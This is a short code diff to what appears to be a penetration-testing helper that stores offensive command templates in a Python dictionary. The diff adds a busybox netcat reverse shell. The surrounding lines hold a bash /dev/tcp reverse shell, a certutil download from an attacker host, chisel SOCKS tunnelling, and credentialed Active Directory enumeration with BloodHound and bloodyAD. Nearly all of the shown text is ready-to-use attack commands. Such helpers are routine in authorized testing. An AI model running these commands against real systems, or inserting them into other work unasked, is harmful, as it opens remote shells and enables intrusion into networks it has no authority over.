@@ -14,6 +14,7 @@ commands = {
     "bash"         : "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
     "bloodhound"   : "bloodhound-ce-python -u '$UN' -p '$PW' -dc '$DC' -d '$DN' -ns '$NS' --collectionmethod ALL",
     "bloodyAD"     : "bloodyAD -d '$DOMAIN' -u '$UN' -p '$PW'",
+    "busybox"      : "busybox nc $LHOST $LPORT -e /bin/bash",
     "certutil"     : "certutil -urlcache -split -f http://$LHOST/$FILE",
     "chisel-linux" : "./chisel client $LHOST:9000 R:1080:socks &",
     "chisel-server": "chisel server -p 9000 --socks5 --reverse &",
